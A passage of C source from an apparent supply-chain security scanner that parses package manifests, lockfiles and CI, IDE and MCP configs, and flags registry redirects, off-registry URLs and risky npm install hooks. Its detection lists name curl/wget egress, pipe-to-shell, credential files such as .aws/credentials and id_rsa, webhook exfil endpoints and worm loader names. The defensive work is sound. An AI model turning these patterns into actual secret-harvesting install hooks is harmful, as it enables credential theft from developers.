/* hlse_manifest.c — manifest dependency-file parsers (package --manifest).
 * Extracted verbatim from hlse_core.c (split increment 6); pure
 * orchestration helpers around hlse_check_package(). */
#include "hlse_manifest.h"
#include "hlse_util.h"
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <strings.h>

/* ── Manifest scanning (Perspective 108, roadmap P1-8) ─────────────────────
 * The single-name `package <name>` check is impractical for real dependency
 * files. `package --manifest <file>` parses a manifest and runs the existing
 * hlse_check_package() over every declared dependency. Ecosystem is inferred
 * from the filename or given explicitly. Pure orchestration of the existing
 * detector — no scoring change, F1 unchanged. */

/* Infer package ecosystem from a manifest filename (basename match). Returns
 * a canonical eco string or NULL if unrecognised. */
const char *
hlse_manifest_ecosystem(const char *path) {
    const char *b = strrchr(path, '/');
    b = b ? b + 1 : path;
    if (strncmp(b, "requirements", 12) == 0 || strcmp(b, "Pipfile") == 0 ||
        strcmp(b, "Pipfile.lock") == 0 || strcmp(b, "pyproject.toml") == 0 ||
        strcmp(b, "poetry.lock") == 0)
        return "pip";
    if (strcmp(b, "package.json") == 0 ||
        strcmp(b, "package-lock.json") == 0 ||
        strcmp(b, "yarn.lock") == 0 ||
        strcmp(b, "pnpm-lock.yaml") == 0) return "npm";
    if (strcmp(b, "Cargo.toml") == 0 || strcmp(b, "Cargo.lock") == 0)
        return "cargo";
    if (strcmp(b, "go.mod") == 0) return "go";
    if (strcmp(b, "Gemfile") == 0 || strcmp(b, "Gemfile.lock") == 0)
        return "gem";
    /* config files carry the same substitution surface as manifests:
     * .npmrc registry=/@scope:registry= redirects where names resolve,
     * pip.conf index-url= is the INI form of --index-url, .gitmodules
     * url= pins a submodule's fetch host, .cargo/config.toml [source]
     * registry= replaces crates.io. */
    if (strcmp(b, ".npmrc") == 0) return "npm";
    if (strcmp(b, "pip.conf") == 0 || strcmp(b, "pip.ini") == 0)
        return "pip";
    if (strcmp(b, ".gitmodules") == 0) return "git";
    if ((strcmp(b, "config.toml") == 0 || strcmp(b, "config") == 0) &&
        strstr(path, ".cargo/")) return "cargo";
    /* Container and CI manifests carry the same substitution surface:
     * `FROM` picks a whole registry, `RUN curl|sh` is a pipe-exec, and
     * a workflow `uses:` ref chooses whose code runs on CI secrets. */
    if (strncmp(b, "Dockerfile", 10) == 0 ||
        strncmp(b, "dockerfile", 10) == 0 ||
        strncmp(b, "Containerfile", 13) == 0 ||
        strncmp(b, "docker-compose.y", 16) == 0 ||
        (strstr(b, ".Dockerfile") != NULL))
        return "docker";
    /* .gitlab-ci.yml must route to glci BEFORE the gha path rule:
     * GitLab syntax is not GitHub Actions — ${{ }} interpolation and
     * pull_request_target do not exist there; script/include do. */
    /* Platform-automation configs: files a platform executes on your
     * behalf — gitpod tasks run on workspace open, netlify/vercel
     * build commands run on deploy previews (a PR edit = RCE in the
     * deploy context), Procfile/app.json run on heroku push,
     * Jenkinsfile @Library loads remote pipeline code, tsconfig
     * plugins load a tsserver extension on workspace open. */
    if (strcmp(b, ".gitpod.yml") == 0 || strcmp(b, ".gitpod.yaml") == 0 ||
        strcmp(b, "netlify.toml") == 0 || strcmp(b, "netlify.yml") == 0 ||
        strcmp(b, "netlify.json") == 0 || strcmp(b, "vercel.json") == 0 ||
        strcmp(b, "Procfile") == 0 || strcmp(b, "procfile") == 0 ||
        strcmp(b, "app.json") == 0 ||
        strncmp(b, "Jenkinsfile", 11) == 0 ||
        strstr(b, ".jenkinsfile") != NULL ||
        strcmp(b, "tsconfig.json") == 0 || strcmp(b, "jsconfig.json") == 0)
        return "plat";
    if (strcmp(b, "composer.json") == 0 ||
        strcmp(b, "composer.lock") == 0)
        return "comp";
    if (strcmp(b, ".gitlab-ci.yml") == 0 ||
        strcmp(b, ".gitlab-ci.yaml") == 0 ||
        strcmp(b, "gitlab-ci.yml") == 0)
        return "glci";
    if (strstr(path, ".github/workflows/") != NULL &&
        (strstr(b, ".yml") != NULL || strstr(b, ".yaml") != NULL))
        return "gha";
    /* MCP server configs (claude_desktop_config.json, .cursor/
     * mcp.json, Cline/Roo settings, …) declare commands the client
     * auto-executes on startup — the tool-poisoning surface where a
     * pipe-to-shell or plaintext-remote URL turns editor init into
     * code exec (Invariant Labs TPA class, 2025).                  */
    if (strcmp(b, "mcp.json") == 0 || strcmp(b, ".mcp.json") == 0 ||
        strcmp(b, "mcp_settings.json") == 0 ||
        strcmp(b, "mcp-settings.json") == 0 ||
        strcmp(b, "cline_mcp_settings.json") == 0 ||
        strcmp(b, "claude_desktop_config.json") == 0)
        return "mcp";
    /* Repo-supplied IDE automation: a devcontainer.json lifecycle
     * command runs the moment a reviewer opens the repo in
     * Codespaces/devcontainers; .vscode/tasks.json runOn:folderOpen
     * and settings.json binary-path keys exec on workspace trust
     * (Snyk "IDE file execution" research). Same substitution
     * surface, same offline check.                                 */
    if (strcmp(b, "devcontainer.json") == 0 ||
        strstr(b, ".devcontainer.json") != NULL)
        return "devc";
    if (strstr(path, ".vscode/") != NULL &&
        (strcmp(b, "tasks.json") == 0 ||
         strcmp(b, "launch.json") == 0 ||
         strcmp(b, "settings.json") == 0))
        return "vsc";
    if (strcmp(b, ".pre-commit-config.yaml") == 0 ||
        strcmp(b, ".pre-commit-config.yml") == 0 ||
        strcmp(b, "pre-commit-config.yaml") == 0)
        return "pck";
    /* CocoaPods Podfile (`source 'url'`) and Swift PM Package.swift
     * (`.package(url: "…")`) — the iOS/macOS forms of registry/dep
     * substitution */
    if (strcmp(b, "Podfile") == 0 || strcmp(b, "Podfile.lock") == 0 ||
        strcmp(b, "podfile") == 0)
        return "pod";
    /* Distro package build scripts: PKGBUILD/APKBUILD function bodies
     * run on makepkg/abuild; pkgname.install hooks run on every pacman
     * install; .ebuild phase functions run on emerge; .spec scriptlets
     * run on rpm install. All are shell executed at build/install. */
    if (strcmp(b, "PKGBUILD") == 0 || strcmp(b, "APKBUILD") == 0 ||
        strstr(b, ".install") != NULL ||
        strstr(b, ".ebuild") != NULL ||
        strstr(b, ".spec") != NULL)
        return "pkbb";
    if (strcmp(b, "Package.swift") == 0 ||
        strcmp(b, "Package.resolved") == 0)
        return "spm";
    /* NuGet config: <packageSources><add value="url"> swaps where
     * every package resolves from — the .NET form of registry hijack */
    if (strcmp(b, "nuget.config") == 0 || strcmp(b, "NuGet.Config") == 0 ||
        strcmp(b, "packages.config") == 0 ||
        strcmp(b, "Directory.Packages.props") == 0 ||
        strcmp(b, "directory.packages.props") == 0)
        return "nuget";
    return NULL;
}

/* Extract the leading pip/requirements-style package name from a line into
 * out (name = leading run of [A-Za-z0-9._-], stopping at a version operator
 * or extras bracket). Returns 1 if a name was found, else 0. Skips blank
 * lines, comments, and pip options (-r/-e/--). */
int
hlse_manifest_name_pip(const char *line, char *out, size_t outcap) {
    const char *s = line;
    size_t n = 0;
    while (*s == ' ' || *s == '\t') s++;
    if (*s == '\0' || *s == '\n' || *s == '#' || *s == '-') return 0;
    /* Quoted-name form: pyproject.toml/TOML dependency arrays and
     * continuation lines (`dependencies = ["requets==1.0",` or the
     * `  "requets==1.0",` lines inside them). Strip a version spec or
     * extras bracket after the name. */
    if (*s == '"' || *s == '\'') {
        char qc = *s++;
        while (*s && *s != qc && n + 1 < outcap &&
               ((*s >= 'A' && *s <= 'Z') || (*s >= 'a' && *s <= 'z') ||
                (*s >= '0' && *s <= '9') || *s == '.' || *s == '_' ||
                *s == '-'))
            out[n++] = *s++;
        out[n] = '\0';
        return n > 0;
    }
    while (*s && n + 1 < outcap &&
           ((*s >= 'A' && *s <= 'Z') || (*s >= 'a' && *s <= 'z') ||
            (*s >= '0' && *s <= '9') || *s == '.' || *s == '_' || *s == '-'))
        out[n++] = *s++;
    out[n] = '\0';
    if (n > 0) {
        /* PEP 621 header line: `dependencies = ["name", ...]` — the
         * first quoted entry inside the array is the package name. */
        if ((strcmp(out, "dependencies") == 0 ||
             strcmp(out, "requires") == 0 ||
             strcmp(out, "dev-dependencies") == 0 ||
             strcmp(out, "optional-dependencies") == 0)) {
            const char *q = s;
            while (*q && *q != '"' && *q != '\'' && *q != '\n') q++;
            if (*q == '"' || *q == '\'') {
                char qc = *q++;
                n = 0;
                while (*q && *q != qc && n + 1 < outcap &&
                       ((*q >= 'A' && *q <= 'Z') ||
                        (*q >= 'a' && *q <= 'z') ||
                        (*q >= '0' && *q <= '9') || *q == '.' ||
                        *q == '_' || *q == '-'))
                    out[n++] = *q++;
                out[n] = '\0';
            }
        }
        return 1;
    }
    return 0;
}

/* Extract the next npm dependency name at/after *cursor, tracking whether we
 * are inside a *dependencies object via *in_deps. Handles both the canonical
 * one-dep-per-line layout and the compact single-line object form, and can be
 * called repeatedly on the same line: it advances *cursor past what it
 * consumed. A dependency entry is  "name" : "version"  inside a dependencies
 * object. Returns 1 and fills out when a name is extracted, 0 when the current
 * text is exhausted. */
int
hlse_manifest_name_npm(const char **cursor, int *in_deps, char *out, size_t outcap) {
    const char *p = *cursor;
    for (;;) {
        if (!*in_deps) {
            /* Look for a dependencies-section keyword on this text. */
            const char *k = NULL, *cands[4]; int ci, best = -1;
            cands[0] = strstr(p, "\"dependencies\"");
            cands[1] = strstr(p, "\"devDependencies\"");
            cands[2] = strstr(p, "\"peerDependencies\"");
            cands[3] = strstr(p, "\"optionalDependencies\"");
            for (ci = 0; ci < 4; ci++)
                if (cands[ci] && (best < 0 || cands[ci] < cands[best])) best = ci;
            if (best < 0) { *cursor = p + strlen(p); return 0; }
            k = strchr(cands[best], '{');
            if (!k) { *cursor = p + strlen(p); return 0; }
            *in_deps = 1;
            p = k + 1;
            continue;
        }
        /* In a deps object: the next '}' closes it; the next '"' before it
         * starts a "name": "ver" entry. */
        {
            const char *close = strchr(p, '}');
            const char *q = strchr(p, '"');
            size_t n = 0;
            const char *r;
            if (!q || (close && close < q)) {
                if (close) { *in_deps = 0; p = close + 1; continue; }
                *cursor = p + strlen(p); return 0;
            }
            r = q + 1;
            while (*r && *r != '"' && n + 1 < outcap) out[n++] = *r++;
            out[n] = '\0';
            if (*r != '"') { *cursor = p + strlen(p); return 0; }
            r++;                                  /* past closing quote */
            while (*r == ' ' || *r == '\t') r++;
            if (*r != ':') { p = r; continue; }   /* not a key — keep scanning */
            *cursor = r + 1;
            if (n > 0) return 1;
        }
    }
}


/* ── npm lifecycle-hook risk ─────────────────────────────────────────────
 * 2025's self-propagating npm worms (Shai-Hulud and the s1ngularity/Nx
 * fallout) execute from install hooks — "postinstall": "node bundle.js"
 * is the canonical Shai-Hulud loader. Lifecycle commands that read the
 * process environment AND open egress, decode+run opaque payloads, or
 * fetch|pipe|execute remote code are near-absent from legitimate
 * packages. Line-scoped: hook entries are `"key": "cmd"` on one line.  */

static int
mh_ci(const char *hay, const char *needle) {
    /* case-insensitive substring */
    for (; *hay; hay++) {
        const char *h = hay, *n = needle;
        while (*h && *n && (*h | 0x20) == (*n | 0x20)) { h++; n++; }
        if (!*n) return 1;
    }
    return 0;
}

static const char *const HOOK_KEYS[] = {
    "\"preinstall\"", "\"install\"", "\"postinstall\"",
    "\"prepare\"", "\"prepack\"", "\"postpack\"",
    "\"prepublish\"", "\"prepublishOnly\"", "\"postpublish\"",
    NULL
};

size_t
hlse_manifest_hook_flags(const char *line, char out[][HLSE_HOOK_REASON_LEN],
                         int scores[], size_t outcap) {
    size_t n = 0;
    int k;
    for (k = 0; HOOK_KEYS[k] && n < outcap; k++) {
        const char *kp = strstr(line, HOOK_KEYS[k]);
        const char *val;
        if (!kp) continue;
        kp += strlen(HOOK_KEYS[k]);
        while (*kp == ' ' || *kp == '\t') kp++;
        if (*kp != ':') continue;
        val = kp + 1;                    /* command text after the colon */
        {
            const char *hook = HOOK_KEYS[k];
            char hb[64];
            size_t hl = strlen(hook);
            if (hl >= sizeof(hb)) hl = sizeof(hb) - 1;
            memcpy(hb, hook + 1, hl - 2);  /* strip quotes */
            hb[hl - 2] = '\0';

            /* Hard IoCs — straight worm/campaign artefacts. */
            if (mh_ci(val, "node bundle.js")) {
                snprintf(out[n], HLSE_HOOK_REASON_LEN,
                    "%s: runs 'node bundle.js' — canonical Shai-Hulud "
                    "loader name", hb);
                scores[n++] = 75;
            } else if (mh_ci(val, "setup_bun.js") ||
                       mh_ci(val, "bun_environment.js") ||
                       mh_ci(val, "node setup_bun")) {
                snprintf(out[n], HLSE_HOOK_REASON_LEN,
                    "%s: runs 'setup_bun.js'/'bun_environment.js' — "
                    "Shai-Hulud 2.0 (Nov 2025 second wave) loader name", hb);
                scores[n++] = 75;
            } else if (mh_ci(val, "webhook.site") ||
                       mh_ci(val, "webhook-test")) {
                snprintf(out[n], HLSE_HOOK_REASON_LEN,
                    "%s: posts to a webhook collector — Shai-Hulud "
                    "exfil endpoint", hb);
                scores[n++] = 75;
            } else if (mh_ci(val, "trufflehog")) {
                snprintf(out[n], HLSE_HOOK_REASON_LEN,
                    "%s: invokes trufflehog — secret-harvesting tool "
                    "abused by npm worms", hb);
                scores[n++] = 70;
            } else {
                /* Compound tells. */
                int env = mh_ci(val, "process.env") || mh_ci(val, "printenv")
                          || mh_ci(val, "/proc/self/environ");
                int egress = mh_ci(val, "curl") || mh_ci(val, "wget")
                             || mh_ci(val, "fetch(") || mh_ci(val, "axios")
                             || mh_ci(val, "http:") || mh_ci(val, "https:")
                             || mh_ci(val, "xmlhttprequest")
                             || mh_ci(val, "node:http")
                             || mh_ci(val, "node:https");
                int pipe_sh = (mh_ci(val, "|sh") || mh_ci(val, "| sh")
                               || mh_ci(val, "|bash") || mh_ci(val, "| bash")
                               || mh_ci(val, "|node") || mh_ci(val, "| node"));
                int credfile = mh_ci(val, ".aws/credentials")
                               || mh_ci(val, "/.aws/") || mh_ci(val, "id_rsa")
                               || mh_ci(val, "/.ssh/") || mh_ci(val, ".npmrc")
                               || (mh_ci(val, "gcloud") && mh_ci(val, "cred"));
                int opaque = mh_ci(val, "eval(") || mh_ci(val, "node -e")
                             || mh_ci(val, "node --eval") || mh_ci(val, "atob(")
                             || mh_ci(val, "buffer.from")
                             || mh_ci(val, "frombase64string")
                             || mh_ci(val, "base64 -d")
                             || mh_ci(val, "base64 --decode");

                if (env && egress) {
                    snprintf(out[n], HLSE_HOOK_REASON_LEN,
                        "%s: reads process.env and opens network egress — "
                        "install-hook secret harvesting", hb);
                    scores[n++] = 65;
                } else if (egress && pipe_sh) {
                    snprintf(out[n], HLSE_HOOK_REASON_LEN,
                        "%s: fetches and pipes remote code to an "
                        "interpreter", hb);
                    scores[n++] = 65;
                } else if (credfile && egress) {
                    snprintf(out[n], HLSE_HOOK_REASON_LEN,
                        "%s: touches credential files and opens network "
                        "egress", hb);
                    scores[n++] = 65;
                } else if (env && credfile) {
                    snprintf(out[n], HLSE_HOOK_REASON_LEN,
                        "%s: reads process.env and credential files", hb);
                    scores[n++] = 55;
                } else if (opaque) {
                    snprintf(out[n], HLSE_HOOK_REASON_LEN,
                        "%s: decodes/evaluates an opaque payload "
                        "(eval/atob/base64/node -e)", hb);
                    scores[n++] = 50;
                }
            }
        }
    }
    return n;
}

/* Lockfile poisoning: a `resolved`/`resolution`/`tarball` field whose URL
 * points off-registry redirects the install to an attacker host — the
 * dependency-substitution vector documented by Liran Tal / Snyk (2021) and
 * still routine in poisoned PR lockfiles. Extracts the lowercased host of
 * the first resolved-style URL on the line; returns 0 when there is none. */
int
hlse_manifest_resolved_host(const char *line, char *out, size_t outcap) {
    static const char *const KEYS[] = {
        "\"resolved\"", "\"resolution\"", "\"tarball\"",
        "resolved \"", "resolved '", "resolved:",
        "resolution:", "tarball:",
        NULL
    };
    int k;
    if (out && outcap) out[0] = '\0';
    if (!line || !out || outcap == 0) return 0;
    for (k = 0; KEYS[k]; k++) {
        const char *kp = strstr(line, KEYS[k]);
        const char *u;
        size_t n = 0;
        if (!kp) continue;
        u = strstr(kp + strlen(KEYS[k]), "https://");
        if (!u) u = strstr(kp + strlen(KEYS[k]), "http://");
        if (!u) continue;
        u += (strncmp(u, "https://", 8) == 0) ? 8 : 7;
        while (*u && *u != '/' && *u != '"' && *u != '\'' &&
               *u != ' ' && *u != '\t' && *u != '\n' && *u != '\r' &&
               *u != ')' && *u != '>' &&
               n + 1 < outcap)
            out[n++] = (char)tolower((unsigned char)*u++);
        out[n] = '\0';
        {   /* strip userinfo (user[:pass]@host) then any :port */
            char *at = strrchr(out, '@');
            if (at) memmove(out, at + 1, strlen(at + 1) + 1);
            {
                char *c = strchr(out, ':');
                if (c) *c = '\0';
            }
        }
        if (out[0]) return 1;
    }
    return 0;
}

/* Registry hosts a lockfile's resolved URL may legitimately point at.
 * Subdomains match (x.github.com); lookalike suffixes do not
 * (evilgithub.com). */
static const char *const REGISTRY_HOSTS[] = {
    "registry.npmjs.org", "registry.yarnpkg.com", "npmjs.com",
    "github.com", "codeload.github.com", "api.github.com",
    "gitlab.com", "bitbucket.org", "raw.githubusercontent.com",
    "objects.githubusercontent.com",
    /* the other canonical package registries — a manifest may point at
     * any of them legitimately */
    "rubygems.org", "pypi.org", "files.pythonhosted.org",
    "proxy.golang.org", "index.crates.io", "crates.io",
    "repo.maven.apache.org", "nuget.org", "api.nuget.org",
    "cdn.cocoapods.org", "trunk.cocoapods.org", "cocoapods.org",
    /* container registries — Dockerfile `FROM` targets */
    "docker.io", "index.docker.io", "registry-1.docker.io",
    "ghcr.io", "gcr.io", "us.gcr.io", "eu.gcr.io", "asia.gcr.io",
    "quay.io", "mcr.microsoft.com", "public.ecr.aws",
    "registry.k8s.io", "docker.pkg.dev",
    NULL
};

int
hlse_manifest_resolved_suspicious(const char *host) {
    int i;
    if (!host || !host[0]) return 0;
    for (i = 0; REGISTRY_HOSTS[i]; i++) {
        const char *h = REGISTRY_HOSTS[i];
        size_t hl = strlen(h), n = strlen(host);
        if (n == hl && strcmp(host, h) == 0) return 0;
        if (n > hl + 1 && host[n - hl - 1] == '.' &&
            strcmp(host + n - hl, h) == 0) return 0;
    }
    return 1;
}

/* VCS / direct-URL dependency source: pip accepts
 * `git+https://host/repo.git#egg=pkg`, `pkg @ https://host/pkg.tar.gz`;
 * npm accepts `"dep": "git+https://host/x.git"` or a bare tarball URL as
 * the version field. The dependency name (#egg= / key) says nothing
 * about where the code actually comes from — an off-forge source is
 * dependency substitution the typosquat check cannot see (a VCS URL has
 * no registry pinning the name). Returns the host on such a reference.
 * `resolved`-style fields are skipped: the resolved check owns them.  */
int
hlse_manifest_vcs_host(const char *line, char *out, size_t outcap) {
    static const char *const RESOLVED_KEYS[] = {
        "\"resolved\"", "resolved ", "resolved:",
        "\"resolution\"", "resolution:",
        "\"tarball\"", "tarball:",
        NULL
    };
    static const char *const VCS_MARKERS[] = {
        "git+", "hg+", "svn+", "bzr+", NULL
    };
    static const char *const DIRECT_EXTS[] = {
        ".git", ".tgz", ".tar.gz", ".zip", ".whl", ".tar",
        NULL
    };
    const char *u = NULL, *scheme_end;
    size_t n = 0;
    int i;

    if (out && outcap) out[0] = '\0';
    if (!line || !out || outcap == 0) return 0;
    for (i = 0; RESOLVED_KEYS[i]; i++)
        if (strstr(line, RESOLVED_KEYS[i])) return 0;

    /* a vcs marker prefix makes any following scheme a VCS reference */
    for (i = 0; VCS_MARKERS[i]; i++) {
        const char *m = strstr(line, VCS_MARKERS[i]);
        if (m) {
            const char *sep = strstr(m + strlen(VCS_MARKERS[i]), "://");
            if (sep) { u = sep; break; }
        }
    }
    if (!u) {
        /* cargo/forge-style `git = "url"` / `"git": "url"` keys — no
         * git+ scheme marker, just a named key whose value is a URL */
        const char *g = line;
        while ((g = strstr(g, "git")) != NULL) {
            const char *s = g + 3;
            while (*s == ' ' || *s == '\t' || *s == '"' || *s == '\'') s++;
            if (*s == '=' || *s == ':') {
                s++;
                while (*s == ' ' || *s == '\t' || *s == '"' || *s == '\'')
                    s++;
                if (strncmp(s, "http://", 7) == 0 ||
                    strncmp(s, "https://", 8) == 0 ||
                    strncmp(s, "git://", 6) == 0 ||
                    strncmp(s, "ssh://", 6) == 0) {
                    u = strstr(s, "://");
                    break;
                }
            }
            g += 3;
        }
    }
    if (!u) {
        /* bare scheme: keep it if the URL is a direct artifact reference
         * (PEP 440 `name @ url`, or a recognisable archive/.git tail) */
        const char *s = strstr(line, "://");
        if (!s) return 0;
        {
            int direct = strstr(line, " @ ") != NULL ||
                         strstr(line, "\" @ \"") != NULL ||
                         strstr(line, "@https") != NULL ||
                         strstr(line, "@ http") != NULL;
            for (i = 0; DIRECT_EXTS[i] && !direct; i++)
                if (strstr(line, DIRECT_EXTS[i])) direct = 1;
            if (!direct) return 0;
            u = s;
        }
    }
    scheme_end = u + 3;
    while (*scheme_end && *scheme_end != '/' && *scheme_end != '"' &&
           *scheme_end != '\'' && *scheme_end != ' ' &&
           *scheme_end != '\t' && *scheme_end != '\n' &&
           *scheme_end != '\r' &&
           *scheme_end != '#' &&
           *scheme_end != ')' && *scheme_end != '>' &&
           n + 1 < outcap)
        out[n++] = (char)tolower((unsigned char)*scheme_end++);
    out[n] = '\0';
    {   /* strip userinfo (user[:pass]@host) then any :port */
        char *at = strrchr(out, '@');
        if (at) memmove(out, at + 1, strlen(at + 1) + 1);
        { char *c = strchr(out, ':'); if (c) *c = '\0'; }
    }
    if (!out[0]) return 0;
    /* reject a 'host' that is really a path fragment */
    if (!strchr(out, '.')) return 0;
    return 1;
}

/* pip resolver-redirect flags: --index-url/--extra-index-url change
 * where every dependency resolves from; --find-links adds an alternate
 * download location; --trusted-host disables TLS verification for a
 * host. Extracts the flag's target host (URL or bare host:port).      */
int
hlse_manifest_index_host(const char *line, char *out, size_t outcap) {
    static const char *const FLAGS[] = {
        "--index-url", "--extra-index-url", "--find-links",
        "--trusted-host",
        /* pip.conf / tox INI forms — "index-url = …" (the `--` variants
         * above also contain these substrings, order keeps them first) */
        "index-url", "extra-index-url", "find-links", "trusted-host",
        NULL
    };
    const char *v = NULL;
    size_t n = 0;
    int i;
    if (out && outcap) out[0] = '\0';
    if (!line || !out || outcap == 0) return 0;
    for (i = 0; FLAGS[i]; i++) {
        const char *f = strstr(line, FLAGS[i]);
        if (!f) continue;
        v = f + strlen(FLAGS[i]);
        while (*v == ' ' || *v == '\t' || *v == '=') v++;
        break;
    }
    if (!v || !*v) return 0;
    /* skip an inline comment start or a dangling flag */
    if (*v == '#') return 0;
    if (strncmp(v, "https://", 8) == 0) v += 8;
    else if (strncmp(v, "http://", 7) == 0) v += 7;
    /* bare host (e.g. --trusted-host) or scheme already skipped */
    while (*v && *v != '/' && *v != '"' && *v != '\'' &&
           *v != ' ' && *v != '\t' && *v != '\n' && *v != '\r' &&
           *v != '#' &&
           *v != ')' && *v != '>' && n + 1 < outcap)
        out[n++] = (char)tolower((unsigned char)*v++);
    out[n] = '\0';
    {   /* strip userinfo then :port */
        char *at = strrchr(out, '@');
        if (at) memmove(out, at + 1, strlen(at + 1) + 1);
        { char *c = strchr(out, ':'); if (c) *c = '\0'; }
    }
    if (!out[0] || !strchr(out, '.')) return 0;
    return 1;
}

/* npm alias specifier: `"name": "npm:other@1.0.0"` installs `other`
 * under the declared name — the name says one package, the registry
 * source is another (dependency confusion that hides in the value).
 * Returns 1 with the alias target's package name in out (scope kept),
 * or 0 when the line carries no npm: specifier. The caller compares
 * target != declared key. */
int
hlse_manifest_alias_target(const char *line, char *out, size_t outcap) {
    const char *nm, *t;
    size_t tl = 0;
    if (out && outcap) out[0] = '\0';
    if (!line || !out || outcap == 0) return 0;
    nm = strstr(line, "npm:");
    if (!nm) nm = strstr(line, "npm: ");   /* tolerates "npm: pkg" */
    if (!nm) return 0;
    t = nm + 4;
    while (*t == ' ' || *t == '"' || *t == '\'') t++;
    if (*t == '@') {            /* scoped target @scope/pkg */
        t++;
        while (*t && *t != '/' && *t != '"' && *t != '\'' &&
               *t != ' ' && tl + 1 < outcap)
            out[tl++] = *t++;
        if (*t == '/' && tl + 1 < outcap) { out[tl++] = '/'; t++; }
    }
    while (*t && *t != '@' && *t != '"' && *t != '\'' &&
           *t != ' ' && *t != '\t' && *t != '\n' && *t != '\r' &&
           tl + 1 < outcap)
        out[tl++] = *t++;
    out[tl] = '\0';
    if (!out[0]) return 0;
    return 1;
}

/* The manifest key a value belongs to: for `"name": "npm:x"` returns
 * "name". Used to compare an npm: alias target against the declared
 * dependency name. Returns 0 when no "key": form precedes pos.      */
int
hlse_manifest_key_before(const char *line, const char *pos,
                         char *out, size_t outcap) {
    const char *colon, *q2, *q1;
    size_t kl;
    if (out && outcap) out[0] = '\0';
    if (!line || !pos || pos <= line || !out || outcap == 0) return 0;
    colon = pos;
    while (colon > line && *colon != ':') colon--;
    if (*colon != ':') return 0;
    q2 = colon;
    while (q2 > line && *q2 != '"') q2--;
    if (*q2 != '"') return 0;
    q1 = q2 - 1;
    while (q1 > line && *q1 != '"') q1--;
    if (*q1 != '"' || q2 - q1 < 2) return 0;
    kl = (size_t)(q2 - q1 - 1);
    if (kl >= outcap) kl = outcap - 1;
    memcpy(out, q1 + 1, kl);
    out[kl] = '\0';
    return 1;
}

/* Registry-override keys: .npmrc `registry=` / `@scope:registry=` /
 * `disturl=`, cargo `[registries.*] registry=`/`[source.crates-io]
 * registry=` — they redirect where every name resolves, so an
 * off-allowlist host is dependency confusion at the source.        */
int
hlse_manifest_registry_host(const char *line, char *out, size_t outcap) {
    static const char *const KEYS[] = { "registry", "disturl",
                                        "dist-url", NULL };
    const char *v = NULL;
    size_t n = 0;
    int i;
    if (out && outcap) out[0] = '\0';
    if (!line || !out || outcap == 0) return 0;
    for (i = 0; KEYS[i]; i++) {
        const char *k = strstr(line, KEYS[i]);
        while (k) {
            /* key boundary: preceded by start/space/quote/'@' scope */
            int boundary = (k == line) ||
                k[-1] == ' ' || k[-1] == '\t' || k[-1] == '"' ||
                k[-1] == '\'' || k[-1] == ':' || k[-1] == '.';
            const char *p;
            if (!boundary) { k = strstr(k + 1, KEYS[i]); continue; }
            p = k + strlen(KEYS[i]);
            while (*p == ' ' || *p == '\t' || *p == '"' || *p == '\'')
                p++;
            if (*p == '=' || *p == ':') {
                p++;
                while (*p == ' ' || *p == '\t' || *p == '"' || *p == '\'')
                    p++;
                if (strncmp(p, "http://", 7) == 0 ||
                    strncmp(p, "https://", 8) == 0) {
                    v = p;
                    break;
                }
            }
            k = strstr(k + 1, KEYS[i]);
        }
        if (v) break;
    }
    if (!v) return 0;
    v = strstr(v, "://") + 3;
    while (*v && *v != '/' && *v != '"' && *v != '\'' &&
           *v != ' ' && *v != '\t' && *v != '\n' && *v != '\r' &&
           *v != '#' &&
           *v != ')' && *v != '>' && *v != '}' && n + 1 < outcap)
        out[n++] = (char)tolower((unsigned char)*v++);
    out[n] = '\0';
    {   /* strip userinfo then :port */
        char *at = strrchr(out, '@');
        if (at) memmove(out, at + 1, strlen(at + 1) + 1);
        { char *c = strchr(out, ':'); if (c) *c = '\0'; }
    }
    if (!out[0] || !strchr(out, '.')) return 0;
    return 1;
}

/* go.mod `replace` directive: `replace foo => host/path v1.0` or the
 * block form `foo => host/path` — substitutes module source, the
 * canonical Go supply-chain vector. Returns 1 with the replacement
 * host in out (0 for local ./ ../ or / paths).                    */
int
hlse_manifest_replace_host(const char *line, char *out, size_t outcap) {
    const char *a = strstr(line, "=>");
    const char *t;
    size_t n = 0;
    if (out && outcap) out[0] = '\0';
    if (!a || !out || outcap == 0) return 0;
    t = a + 2;
    while (*t == ' ' || *t == '\t' || *t == '"' || *t == '\'') t++;
    if (*t == '.' || *t == '/') return 0;   /* local path replacement */
    while (*t && *t != '/' && *t != ' ' && *t != '\t' &&
           *t != '"' && *t != '\'' && *t != '\n' && *t != '\r' &&
           n + 1 < outcap)
        out[n++] = (char)tolower((unsigned char)*t++);
    out[n] = '\0';
    { char *c = strchr(out, ':'); if (c) *c = '\0'; }
    if (!out[0] || !strchr(out, '.')) return 0;
    return 1;
}

/* go.mod `replace … => ../local|/abs/path` — the local-path form of
 * the same substitution: the module is swapped for attacker-controlled
 * files on disk (a vendored repo ships its own 'fork'). Returns 1 when
 * the replacement target is a filesystem path.                    */
int
hlse_manifest_replace_local(const char *line) {
    const char *a = strstr(line, "=>");
    const char *t;
    if (!a) return 0;
    t = a + 2;
    while (*t == ' ' || *t == '\t' || *t == '"' || *t == '\'') t++;
    return (*t == '.' || *t == '/');
}

/* Cargo.toml `[patch.<registry>]` / `[replace]` table header — the
 * table redirects dependency resolution wholesale (each row swaps the
 * crates.io source for a git/path/other-registry one). The `git =`
 * rows inside it are already scored by the VCS-source check; flagging
 * the header marks the redirection itself for review. Returns 1 on a
 * patch/replace table header.                                    */
int
hlse_manifest_cargo_patch(const char *line) {
    const char *p = line;
    while (*p == ' ' || *p == '\t') p++;
    return strncmp(p, "[patch.", 6) == 0 ||
           strcmp(p, "[patch]") == 0 ||
           strncmp(p, "[patch]", 7) == 0 ||
           strncmp(p, "[replace]", 9) == 0;
}

/* Package.swift `.package(url: "https://…", …)` / Package.resolved
 * `"location": "url"` — the dependency's fetch host. Returns 1 with
 * the lowercased host in out, or 0. */
int
hlse_manifest_swift_url(const char *line, char *out, size_t outcap) {
    const char *p;
    size_t n = 0;
    if (out && outcap) out[0] = '\0';
    if (!line || !out || outcap == 0) return 0;
    p = strstr(line, ".package");
    if (p) {
        p = strstr(p, "url");
    } else {
        p = strstr(line, "\"location\"");
        if (p) p = strchr(p, ':');
    }
    if (!p) return 0;
    p = strstr(p, "http");
    if (!p) return 0;
    if (strncmp(p, "https://", 8) == 0) p += 8;
    else if (strncmp(p, "http://", 7) == 0) p += 7;
    else return 0;
    while (*p && *p != '/' && *p != '"' && *p != '\'' &&
           *p != ' ' && *p != '\t' && *p != '\n' && *p != '\r' &&
           *p != ')' && n + 1 < outcap)
        out[n++] = (char)tolower((unsigned char)*p++);
    out[n] = '\0';
